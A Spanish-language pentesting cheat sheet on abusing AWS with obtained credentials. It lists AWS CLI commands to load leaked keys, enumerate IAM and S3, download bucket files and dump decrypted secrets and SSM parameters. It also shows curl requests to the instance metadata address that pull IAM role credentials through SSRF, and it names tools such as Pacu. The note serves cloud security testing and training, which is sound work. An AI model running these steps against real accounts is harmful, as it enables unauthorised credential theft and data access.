#reference #Ciberseguridad

**AWS CLI** en pentest cloud = enumerar y abusar de servicios AWS con credenciales obtenidas (keys filtradas, SSRF a metadata, etc.). Punto de partida tras conseguir un par `AKIA.../secret`.

# Configurar credenciales

```bash
aws configure                       # interactivo
# o exportar
export AWS_ACCESS_KEY_ID=AKIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...         # si son temporales (STS)

# ¿Quién soy? (lo primero)
aws sts get-caller-identity
```

# Enumeración inicial

```bash
# Identidad y región
aws sts get-caller-identity
aws ec2 describe-instances --region us-east-1

# S3
aws s3 ls                                   # buckets accesibles
aws s3 ls s3://bucket --recursive
aws s3 cp s3://bucket/secreto.txt .         # descargar

# IAM (permisos = clave de la escalada)
aws iam get-user
aws iam list-attached-user-policies --user-name X
aws iam list-user-policies --user-name X

# Secretos / parámetros
aws secretsmanager list-secrets
aws ssm get-parameters-by-path --path / --recursive --with-decryption
```

# Vía SSRF — metadata (IMDS)

```bash
# IMDSv1 (si no está mitigado)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<rol>
# -> AccessKeyId, SecretAccessKey, Token  (usar con la CLI)
```

# Escalada / abuso

Buscar permisos mal configurados con herramientas dedicadas:

| Herramienta | Uso |
|-------------|-----|
| **enumerate-iam** | Qué acciones permite la clave. |
| **Pacu** | Framework de explotación AWS. |
| **ScoutSuite / Prowler** | Auditoría de misconfiguraciones. |
| **CloudGoat** | Lab vulnerable para practicar. |

# Recursos
### [[AWS-PE]] · [[!Proxy Bypass]]
### [HackTricks Cloud — AWS](https://cloud.hacktricks.xyz/pentesting-cloud/aws-security) · [Pacu](https://github.com/RhinoSecurityLabs/pacu)
